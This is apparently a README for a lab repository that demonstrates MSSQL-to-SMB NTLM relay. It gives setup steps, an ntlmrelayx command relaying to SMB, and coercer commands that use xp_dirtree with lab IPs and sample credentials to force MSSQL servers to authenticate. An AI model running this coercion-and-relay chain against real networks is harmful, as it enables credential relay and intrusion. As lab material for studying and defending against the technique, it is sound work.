# MSSQL2SMB

```bash
cd mssql-relay-lab
python3 impacket/setup.py install
source impacket/venv/bin/activate
```

On host MSSQL-1:

1. Disable firewall.
2. Setup domain privileged user account as a service account for the MSSQL service.

![mssql_xp_dirtree_multiple_coerce](https://github.com/innxrmxst/mssql-relay-lab/blob/main/images/mssql2smb/mmssql_configuration.png)

## Setup a ntlmrelayx listener

```bash
#Relay to SMB on a targeted host without SMB signing. Where smb://<targeted host>
python3 ntlmrelayx.py -t smb://10.6.15.13 -smb2support
```

## Coerce MSSQL against SMB

```bash
#Single targeted MSSQL server IP.
python3 mssql-coercer.py -server 10.6.15.12 -username sql-user1 -password 'Passw0rd!' -domain ludus -windows-auth -xp-target 10.6.15.10 -share-name test
```bash
#Multiple IPs for targeted MSSQL servers. -xp-target <kali host>. ~/ip_addresses_file.txt is a file with MSSQL servers.
python3 mssql-coercer.py -ip-file ~/ip_addresses_file.txt -username sql-user1 -password 'Passw0rd!' -domain ludus -windows-auth -xp-target 10.6.15.10 -share-name test
```

### Coercer

![mssql_xp_dirtree_multiple_coerce](https://github.com/innxrmxst/mssql-relay-lab/blob/main/images/mssql2smb/mssql_xp_dirtree_multiple_coerce.png)

### Listener

![mssql2smb_ntlmrelayx](https://github.com/innxrmxst/mssql-relay-lab/blob/main/images/mssql2smb/mssql2smb_ntlmrelayx.png)

---

# Credits

- https://github.com/fortra/impacket/pull/1397
- https://www.tripwire.com/state-of-security/how-to-prevent-high-risk-authentication-coercion-vulnerabilities
